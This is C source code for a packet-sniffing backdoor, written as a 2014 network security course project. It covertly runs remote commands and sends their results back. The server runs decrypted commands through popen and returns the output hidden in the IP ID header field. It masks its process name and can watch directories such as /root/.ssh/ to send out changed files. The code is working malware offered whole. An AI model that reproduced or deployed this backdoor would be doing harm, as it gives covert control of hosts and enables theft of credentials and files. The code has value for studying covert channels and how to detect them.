/*
| ------------------------------------------------------------------------------
| File:     bd.c
| Purpose:  COMP 8505 Final Project
| Authors:  Kevin Eng, Jeremy Tsang
| Date:     Dec 8, 2014
|
| Notes:    A packet-sniffing backdoor in C. This program includes the client
|           and server together as one main executable.
|
|           Compile using 'make clean' and 'make'.
|
|           Usage: ./backdoor -h
|
| ------------------------------------------------------------------------------
*/

/*
| ------------------------------------------------------------------------------
| Headers
| ------------------------------------------------------------------------------
*/

#include "bd.h"
pcap_t *client_handle;          /* Client pcap session handle */
/*
| ------------------------------------------------------------------------------
| Main Function
| ------------------------------------------------------------------------------
*/

int main(int argc, char **argv){

    /* Raise privileges */

    setuid(0);
    setgid(0);

    /* Parse arguments */

    int is_server = 0;
    struct client_opt c_opt;
    c_opt.key[0] = '\0';
    c_opt.target_host[0] = '\0';
    c_opt.command[0] = '\0';
    c_opt.target_port = 0;
    c_opt.device[0] = '\0';
    c_opt.protocol = 0;
    struct server_opt s_opt;
    s_opt.key[0] = '\0';
    s_opt.device[0] = '\0';
    s_opt.protocol = 0;
    s_opt.packet_delay = 200000; // Default 1/50 of a second

    int opt;
    while((opt = getopt(argc, argv, "hsk:i:d:p:ut:x:")) != -1){
        switch(opt){
            case 'h':
                usage();
                return 0;
                break;
            case 's':
                is_server = 1;
                break;
            case 'k':
                strcpy(c_opt.key, optarg);
                strcpy(s_opt.key, optarg);
            case 'i':
                strcpy(c_opt.device, optarg);
                strcpy(s_opt.device, optarg);
                break;
            case 'd':
                strcpy(c_opt.target_host, optarg);
                break;
            case 'p':
                c_opt.target_port = atoi(optarg);
                break;
            case 'u':
                c_opt.protocol = 1;
                s_opt.protocol = 1;
                break;
            case 't':
                s_opt.packet_delay = atoi(optarg);
                break;
            case 'x':
                strcpy(c_opt.command, optarg);
                break;
            default:
                printf("Type -h for usage help.\n");
                return 1;
        }
    }

    /* Mask process name */

    mask_process(argv, PROCESS_NAME);

    /* Validation then run client or server */

    if(is_server){
        if(s_opt.device[0] == '\0'){
            printf("Type -h for usage help.\n");
            return 1;
        }
        else{
            server(s_opt);

        }
    }
    else{
        if(c_opt.target_host[0] == '\0' || c_opt.command[0] == '\0' || c_opt.target_port == 0 || c_opt.device[0] == '\0'){
            printf("Type -h for usage help.\n");
            return 1;
        }
        else{
            client(c_opt);
        }
    }

    return 0;
}

/*
| ------------------------------------------------------------------------------
| Client
| ------------------------------------------------------------------------------
*/

void client(struct client_opt c_opt){

    /* Display options */

    printf("Running client...\n");
    printf("Target Host: %s\n",c_opt.target_host);
    printf("Target Port: %d\n",c_opt.target_port);
    printf("Interface: %s\n", c_opt.device);
    if(c_opt.protocol == 1)
        printf("Protocol: UDP\n");
    else
        printf("Protocol: TCP\n");
    printf("Command: %s\n",c_opt.command);

    /* Encrypt command */

    char *bd_message;
    int bd_message_len;
    bd_message = bd_encrypt(c_opt.command, &bd_message_len, c_opt.key);
    if(bd_message == NULL){
        return;
    }

    /* Set packet options and send packet */

    struct addr_info user_addr;
    user_addr.shost = DEFAULT_SRC_IP;
    user_addr.sport = DEFAULT_SRC_PORT;
    user_addr.dhost = c_opt.target_host;
    user_addr.dport = c_opt.target_port;
    user_addr.raw_socket = 0;

    // Create a raw socket and set SO_REUSEADDR
    if(c_opt.protocol == 1)
        user_addr.raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    else
        user_addr.raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

    int arg = 1;
    if(setsockopt(user_addr.raw_socket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
        system_fatal("setsockopt");

    // Send packet
    if(c_opt.protocol == 1)
        send_udp_datagram(&user_addr, bd_message, bd_message_len, 0);
    else
        send_tcp_datagram(&user_addr, bd_message, bd_message_len, 0);

    /*
    | --------------------------------------------------------------------------
    | Listen for response
    | --------------------------------------------------------------------------
    */

    /* Initialize variables and functions */


    char *dev;                      /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    struct bpf_program fp;          /* The compiled filter */
    char filter_exp[] = "port 12345"; /* The filter expression */
    bpf_u_int32 mask;               /* Our netmask */
    bpf_u_int32 net;                /* Our IP */

    // Get network interface
    dev = c_opt.device;
    if(dev == NULL) {
        printf("Couldn't find default device: %s\n", errbuf);
        system_fatal("pcap_lookupdev");
    }
    printf("Device: %s\n", dev);

    // Get interface properties
    if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1){
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }

    // Open sniffing session
    client_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(client_handle == NULL) {
        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
        system_fatal("pcap_open_live");
    }

    /* Build packet filter */

    // Compile filter
    if(pcap_compile(client_handle, &fp, filter_exp, 0, net) == -1){
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(client_handle));
        system_fatal("pcap_compile");
    }

    // Apply filter
    if(pcap_setfilter(client_handle, &fp) == -1){
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(client_handle));
        system_fatal("pcap_setfilter");
    }
    printf("Filter: %s\n", filter_exp);

    /* Packet capture loop */

    // Packet capture loop
    struct message_buffer msg_buf;
    msg_buf.position = 0;
    memset(msg_buf.buffer, 0, sizeof(msg_buf.buffer));

    printf("Capturing...\n");
    pcap_loop(client_handle, -1, client_packet_handler, (u_char *)&msg_buf);

    /* Transmitted data */

    printf("Total Buffer: %zu bytes\n%s\n", strlen(msg_buf.buffer), msg_buf.buffer);

    if(strncmp(c_opt.command,"WATCH:",6) == 0){
        char file_name[1024] = {0};

        char current_date[128] = {0};
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        strftime(current_date, sizeof(current_date)-1, "%Y_%m_%d_%H:%M_%S_", t);
        printf("Current Date: %s", current_date);

        strncpy(file_name, current_date, 1024);

        int c = 0;
        for(c = 0; c < strlen(c_opt.command); c++){
            if(c_opt.command[c] == '/')
                c_opt.command[c] = '_';
        }

        strncpy(file_name + strlen(current_date), c_opt.command, 1024 - strlen(current_date));
        
        char file_path[2048] = "exfil/";
        strncat(file_path, file_name, strlen(file_name));
        
        // Create dir
        struct stat st = {0};

        if (stat("exfil", &st) == -1) {
            mkdir("exfil", 0700);
        }
        
        // Write output to timestamped file
        FILE *fp;
        fp = fopen(file_path, "w");
        fwrite(msg_buf.buffer, 1, sizeof(msg_buf.buffer), fp);
        fclose(fp);
    }
    else{
        printf("Total Buffer: %zu bytes\n%s\n", strlen(msg_buf.buffer), msg_buf.buffer);
    }
}

/*
| ------------------------------------------------------------------------------
| Server
| ------------------------------------------------------------------------------
*/

void server(struct server_opt s_opt){

    printf("Running server...\n");
    printf("Interface: %s\n", s_opt.device);
    if(s_opt.protocol == 1)
        printf("Protocol: UDP\n");
    else
        printf("Protocol: TCP\n");
    printf("Packet delay: %dus\n", s_opt.packet_delay);

    /* Initialize variables and functions */

    pcap_t *handle;                 /* Session handle */
    char *dev;                      /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    struct bpf_program fp;          /* The compiled filter */
    char filter_exp[] = "port 12345"; /* The filter expression */
    bpf_u_int32 mask;               /* Our netmask */
    bpf_u_int32 net;                /* Our IP */

    // Get network interface
    dev = s_opt.device; //dev = "wlp4s5"; //dev = pcap_lookupdev(errbuf);
    if(dev == NULL) {
        printf("Couldn't find default device: %s\n", errbuf);
        system_fatal("pcap_lookupdev");
    }
    printf("Device: %s\n", dev);

    // Get interface properties
    if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1){
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }

    // Open sniffing session
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL) {
        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
        system_fatal("pcap_open_live");
    }

    /* Build packet filter */

    // Compile filter
    if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        system_fatal("pcap_compile");
    }

    // Apply filter
    if(pcap_setfilter(handle, &fp) == -1){
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        system_fatal("pcap_setfilter");
    }
    printf("Filter: %s\n", filter_exp);

    /* Packet capture loop */

    // Packet capture loop
    printf("Capturing...\n");
    pcap_loop(handle, -1, server_packet_handler, (u_char *)&s_opt);
}

/*
| ------------------------------------------------------------------------------
| Send Raw TCP Packet
| ------------------------------------------------------------------------------
*/

int send_tcp_datagram(struct addr_info *user_addr, char *data, int data_len, int mode){

    /* Declare variables */

    // Typecast datagram
    char datagram[PKT_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    char *data_ptr = (char *)(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(user_addr->dport);
    sin.sin_addr.s_addr = inet_addr(user_addr->dhost);

    pseudo_tcp_header psh;

    // Zero out the buffer where the datagram will be stored
    memset(datagram, 0, PKT_SIZE);

    /* IP header */

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons((short)(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len));

    /* Covert Channel */
    if(mode == 0)
        iph->id = htons(DEFAULT_IP_ID);
    else if(mode == 1){
        if(data_len == 1){
            ;
        }
        else if(data_len == 2){
            ;
        }
        iph->id = htons(*((u_short *)data));

        // Set data to "" and 0 len
        data_len = 0;
    }

    iph->frag_off = 0;
    iph->ttl = DEFAULT_TTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; // Initialize to zero before calculating checksum
    iph->saddr = inet_addr(user_addr->shost);
    iph->daddr = inet_addr(user_addr->dhost);

    iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);

    /* TCP header */

    tcph->source = htons(user_addr->sport);
    tcph->dest = htons(user_addr->dport);
    tcph->seq = 1487534554;
    tcph->ack_seq = 0;
    tcph->doff = 5; // Data Offset is set to the TCP header length
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(WIN_SIZE);
    tcph->check = 0; // Initialize the checksum to zero (kernel's IP stack will fill in the correct checksum during transmission)
    tcph->urg_ptr = 0;

    /* Data */

    memcpy(data_ptr, data, data_len);

    /* Calculate Checksum */

    psh.source_address = inet_addr(user_addr->shost);
    psh.dest_address = inet_addr(user_addr->dhost);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + data_len);
    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
    psh.data = data;

    tcph->check = csum((unsigned short*)&psh, sizeof(pseudo_tcp_header));

    /* Build our own header */

    {
        int one = 1;
        const int *val = &one;
        if (setsockopt (user_addr->raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
            system_fatal("setsockopt");
    }

    /* Send the packet */

    if(sendto(user_addr->raw_socket, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
        system_fatal("sendto");
        return -1;
    }
    else{
        printf("Sent TCP Packet with command!\n");
        return 0;
    }
}

/*
| ------------------------------------------------------------------------------
| Send Raw UDP Packet (Duplicate of send_tcp_datagram() above)
| ------------------------------------------------------------------------------
*/

int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len, int mode){

    /* Declare variables */

    // Typecast datagram
    char datagram[PKT_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    char *data_ptr = (char *)(datagram + sizeof(struct iphdr) + sizeof(struct udphdr));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(user_addr->dport);
    sin.sin_addr.s_addr = inet_addr(user_addr->dhost);

    pseudo_udp_header psh;

    // Zero out the buffer where the datagram will be stored
    memset(datagram, 0, PKT_SIZE);

    /* IP header */

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons((short)(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len));

    /* Covert Channel */
    if(mode == 0)
        iph->id = htons(DEFAULT_IP_ID);
    else if(mode == 1){
        if(data_len == 1){
            ;
        }
        else if(data_len == 2){
            ;
        }
        iph->id = htons(*((u_short *)data));

        // Set data to "" and 0 len
        data_len = 0;
    }

    iph->frag_off = 0;
    iph->ttl = DEFAULT_TTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0; // Initialize to zero before calculating checksum
    iph->saddr = inet_addr(user_addr->shost);
    iph->daddr = inet_addr(user_addr->dhost);

    iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);

    /* UDP header */

    udph->source = htons(user_addr->sport);
    udph->dest = htons(user_addr->dport);
    udph->len = htons((short)(sizeof(struct udphdr) + data_len));
    udph->check = 0; // Initialize the checksum to zero

    /* Data */

    memcpy(data_ptr, data, data_len);

    /* Calculate Checksum */

    psh.source_address = inet_addr(user_addr->shost);
    psh.dest_address = inet_addr(user_addr->dhost);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + data_len);
    memcpy(&psh.udp, udph, sizeof(struct udphdr));
    psh.data = data;

    udph->check = csum((unsigned short*)&psh, sizeof(pseudo_udp_header));

    /* Build our own header */

    {
        int one = 1;
        const int *val = &one;
        if (setsockopt (user_addr->raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
            system_fatal("setsockopt");
    }

    /* Send the packet */

    if(sendto(user_addr->raw_socket, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
        system_fatal("sendto");
        return -1;
    }
    else{
        printf("Sent UDP Packet with command!\n");
        return 0;
    }
}

/*
| ------------------------------------------------------------------------------
| Client Packet Handler Function
| ------------------------------------------------------------------------------
*/

void client_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){

    struct message_buffer *msg_buf_ptr = (struct message_buffer *)args;

    printf("\nGot packet...\n");

    /* Parse packet */

    // Get packet info
    struct parsed_packet packet_info = {0}; // Initialize with 0
    if(packet_typecast(packet, &packet_info) == 0){
        printf("packet_typecast");
        return;
    }

    /* Covert Channel */
    union Segment seg;
    seg.s = ntohs(packet_info.ip->ip_id);
    printf("\nID: %d\n", seg.s);

    // End transmission if got "fin" packet or buffer is full
    if(seg.s == 65535 || msg_buf_ptr->position >= MESSAGE_MAX_SIZE){
        //printf("pcap_breakloop\n");
        pcap_breakloop(client_handle);
        return;
    }
    // Skip 2nd byte if its 11111111 (because we are sending data 2 bytes at a time)
    else if(seg.byte.c2 == 255){
        memcpy(msg_buf_ptr->buffer + msg_buf_ptr->position, &seg.byte.c1, 1);
        msg_buf_ptr->position++;
    }
    // Both are data bytes
    else{
        memcpy(msg_buf_ptr->buffer + msg_buf_ptr->position, &seg.s, 2);
        msg_buf_ptr->position = msg_buf_ptr->position + 2;
    }

    printf("Buffer: %zu bytes\n%s\n", strlen(msg_buf_ptr->buffer), msg_buf_ptr->buffer);
}

/*
| ------------------------------------------------------------------------------
| Server Packet Handler Function
| ------------------------------------------------------------------------------
*/

void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){

    struct server_opt *s_opt_ptr = (struct server_opt *)args;

    printf("\n");
    printf("Got packet...\n");

    /* Parse packet */

    // Get packet info
    struct parsed_packet packet_info = {0}; // Initialize with 0
    if(packet_typecast(packet, &packet_info) == 0){
        printf("packet_typecast");
        return;
    }

    /* Decrypt remaining packet data */

    short payload_len = 0;
    int packet_protocol = 0; // 0 for TCP, 1 for UDP
    if(packet_info.ip->ip_p == IPPROTO_UDP){
        payload_len = ntohs(packet_info.ip->ip_len) - sizeof(struct iphdr) - sizeof(struct udphdr);
        packet_protocol = 1;
    }
    else if(packet_info.ip->ip_p == IPPROTO_TCP){
        payload_len = ntohs(packet_info.ip->ip_len) - sizeof(struct iphdr) - sizeof(struct tcphdr);
        packet_protocol = 0;
    }

    //printf("payload_len: %d\n",payload_len);
    char *bd_command;
    bd_command = bd_decrypt((char *)packet_info.payload, payload_len, s_opt_ptr->key);
    if(bd_command == NULL){
        return;
    }

    /* Handle command */

    // Prepare output buffer
    char output[MESSAGE_MAX_SIZE] = {0};

    // If file exfil command
    if(strncmp(bd_command,"WATCH:",6) == 0){
        printf("%s\n", bd_command);

        char file_path[1024] = {0};
        strncpy(file_path, bd_command + 6, 1024);
        printf("File path: %s\n", file_path);
        
        // Watch file path
        char file_name[1024] = {0};
        inot(file_name, file_path);
        
        strncat(file_path, file_name, 1024 - strlen(file_path));
        printf("Full path: %s\n", file_path);
        
        FILE *fp;
        if((fp = fopen(file_path, "r")) == NULL){
            strcpy(output, "File not found...");
        }
        else{
            fread((void *)output, sizeof(char), MESSAGE_MAX_SIZE, fp);

            printf("File content: \n%s\n", output);
        };
        fclose(fp);
    }
    else{ // Normal command

        /* Execute command */

        FILE *fp;
        fp = popen(bd_command, "r");
        if(fp == NULL){
            printf("Command error!\n");
            return;
        }
        printf("Command executed.\n");

        // Read in command results
        fread((void *)output, sizeof(char), MESSAGE_MAX_SIZE, fp);
        fclose(fp);
    }


    /* Get destination port from packet based on TCP or UDP
       Create a raw socket and set SO_REUSEADDR */

    u_short dport = 0; // Destination port is the source port of the packet
    u_short sport = 0; // Source port is the destination port of the packet
    int skt;
    if(packet_protocol == 1){
        dport = ntohs(packet_info.udp->uh_sport);
        sport = ntohs(packet_info.udp->uh_dport);
        skt = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    }
    else if(packet_protocol == 0){
        dport = ntohs(packet_info.tcp->th_sport);
        sport = ntohs(packet_info.tcp->th_dport);
        skt = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    }

    int arg = 1;
    if(setsockopt(skt, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
        system_fatal("setsockopt");

    /* Get host IP from interface */

    struct ifreq ifr;
    size_t if_name_len = strlen(s_opt_ptr->device);
    if (if_name_len < sizeof(ifr.ifr_name)) {
        memcpy(ifr.ifr_name, s_opt_ptr->device, if_name_len);
        ifr.ifr_name[if_name_len] = 0;
    }
    else {
        printf("Interface name is too long");
        return;
    }

    if(ioctl(skt,SIOCGIFADDR, &ifr) == -1) {
        int temp_errno=errno;
        close(skt);
        printf("%s",strerror(temp_errno));
        return;
    }

    // Cast to sockaddr_in and extract sin_addr
    struct sockaddr_in* hostaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    printf("IP address: %s\n",inet_ntoa(hostaddr->sin_addr));


    /* Prepare destination sockaddr_in */

    struct sockaddr_in dst_host;

    memset(&dst_host, 0, sizeof(struct sockaddr_in));
    dst_host.sin_family = AF_INET;
    dst_host.sin_addr.s_addr = packet_info.ip->ip_src.s_addr;
    dst_host.sin_port = dport;

    /* Prepare address info structure for raw packet crafting */

    struct addr_info server_addr;
    char shost[17];
    char dhost[17];
    inet_ntop(AF_INET, &(hostaddr->sin_addr), shost, sizeof(shost));
    inet_ntop(AF_INET, &(packet_info.ip->ip_src), dhost, sizeof(dhost));
    server_addr.shost = shost;
    server_addr.sport = sport;
    server_addr.dhost = dhost;
    server_addr.dport = dport;
    server_addr.raw_socket = skt;

    printf("shost: %s\n", server_addr.shost);
    printf("dhost: %s\n", server_addr.dhost);
    printf("sport: %d\n", server_addr.sport);
    printf("dport: %d\n", server_addr.dport);


    // Wait half a second for client to open pcap session...
    usleep(500000);
    //char test[] = "nexus";

    // 2 bytes at a time
    size_t output_len = strlen(output);
    int c = 0;
    for(c = 0; c < output_len; c = c + 2){

        char segment[2] = {0};
        // Send 1 char
        if(c + 1 >= output_len){
            segment[0] = output[c];
            segment[1] = (u_char)255;
        }
        // Send 2 chars
        else{
            segment[0] = output[c];
            segment[1] = output[c + 1];
        }

        // Send packet
        if(packet_protocol == 1)
            send_udp_datagram(&server_addr, segment, sizeof(segment), 1);
        else
            send_tcp_datagram(&server_addr, segment, sizeof(segment), 1);

        usleep(s_opt_ptr->packet_delay);
    }

    // Send ending packet 11111111 11111111 (65535)
    char segment[2];
    segment[0] = (u_char)255;
    segment[1] = (u_char)255;
    if(packet_protocol == 1)
        send_udp_datagram(&server_addr, segment, sizeof(segment), 1);
    else
        send_tcp_datagram(&server_addr, segment, sizeof(segment), 1);

}
/*
| ------------------------------------------------------------------------------
| Watch directory with inotify
| 
| Watches filePath and sets fileName to the name of the first file that returned an event
| ------------------------------------------------------------------------------
 */

void inot(char *fileName, char* filePath) {
    int length, i = 0;
    int fd, wd;

    char buffer[EVENT_BUF_LEN];

    /*creating the INOTIFY instance*/
    fd = inotify_init();

    /*checking for error*/
    if (fd < 0) {
        perror("inotify_init");
    }
    wd = inotify_add_watch(fd, filePath, (uint32_t) IN_MODIFY | IN_CREATE | IN_DELETE);

    length = read(fd, buffer, EVENT_BUF_LEN);

    /*checking for error*/
    if (length < 0) {
        perror("read");
    }

    /*actually read return the list of change events happens. Here, read the change event one by one and process it accordingly.*/
    while (i < length) {
        struct inotify_event *event = (struct inotify_event *)&buffer[i];
        if (event->len) {
            if (event->mask & IN_CREATE) {
                if (event->mask & IN_ISDIR) {
                    //printf( "New directory %s created.\n", event->name );
                }
                else {
                    //printf( "New file %s created.\n", event->name );
                    strncpy(fileName, event->name, 1024);
                }
            }
            else if (event->mask & IN_DELETE) {
                if (event->mask & IN_ISDIR) {
                    //printf( "Directory %s deleted.\n", event->name );
                }
                else {
                    //printf( "File %s deleted.\n", event->name );
                    strncpy(fileName, event->name, 1024);
                }
            }
            else if (event->mask & IN_MODIFY) {
                if (event->mask & IN_ISDIR) {
                    //printf( "Directory %s modified.\n", event->name );
                }
                else {
                    //printf( "File %s modified.\n", event->name );
                    strncpy(fileName, event->name, 1024);
                }
            }

        }
        i += EVENT_SIZE + event->len;
    }
    /*removing the directory from the watch list.*/
    inotify_rm_watch(fd, wd);

    /*closing the INOTIFY instance*/
    close(fd);

}

/*
| ------------------------------------------------------------------------------
| Mask process under daemon
| ------------------------------------------------------------------------------
*/

void mask_process(char *argv[], char *name){

    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], name);
    prctl(PR_SET_NAME, name, 0, 0);
}

/*
| ------------------------------------------------------------------------------
| Usage printout
| ------------------------------------------------------------------------------
*/

void usage(){

    printf("\n");
    printf("COMP 8505 Final Project - Packet Sniffing Backdoor\n");
    printf("Usage: ./backdoor [OPTIONS]\n");
    printf("---------------------------\n");
    printf("  -h                    Display this help.\n");
    printf("CLIENT (default)\n");
    printf("  -k <key>              The key to encrypt transmission with.\n");
    printf("  -d <target_host>      The target host where the backdoor server is running.\n");
    printf("  -p <target_port>      The target port to send to.\n");
    printf("  -i <interface_name>   Network interface to use.\n");
    printf("  -u                    Use UDP instead of TCP (TCP is default).\n");
    printf("  -x <command>          The command to run on the target host. To watch a directory\n");
    printf("                        for activity, type 'WATCH:' followed by the directory path\n");
    printf("                        e.g. 'WATCH:/root/.ssh/'.\n");
    printf("SERVER\n");
    printf("  -k <key>              The key to encrypt transmission with.\n");
    printf("  -s                    Enables server mode.\n");
    printf("  -i <interface_name>   Network interface to use.\n");
    printf("  -u                    Use UDP instead of TCP (TCP is default).\n");
    printf("  -t <micro_seconds>    Microseconds between covert response packets (200000 is default).\n");
    printf("\n");
}

/*
| ------------------------------------------------------------------------------
| Fatal error
| ------------------------------------------------------------------------------
*/

// Prints the error stored in errno and aborts the program.
static void system_fatal(const char* message) {
    perror(message);
    exit(EXIT_FAILURE);
}
